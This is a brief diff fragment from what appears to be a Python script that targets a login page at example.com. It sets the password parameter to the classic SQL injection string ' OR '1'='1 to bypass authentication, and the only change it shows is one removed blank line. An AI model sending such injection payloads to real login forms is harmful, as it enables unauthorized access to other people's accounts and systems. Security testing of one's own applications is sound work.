@@ -15,7 +15,6 @@ target_url = "http://example.com/login.php" # change
 
 payload = "' OR '1'='1" # Define the payload
 
-
 params = {
     'username': 'admin',
     'password': payload
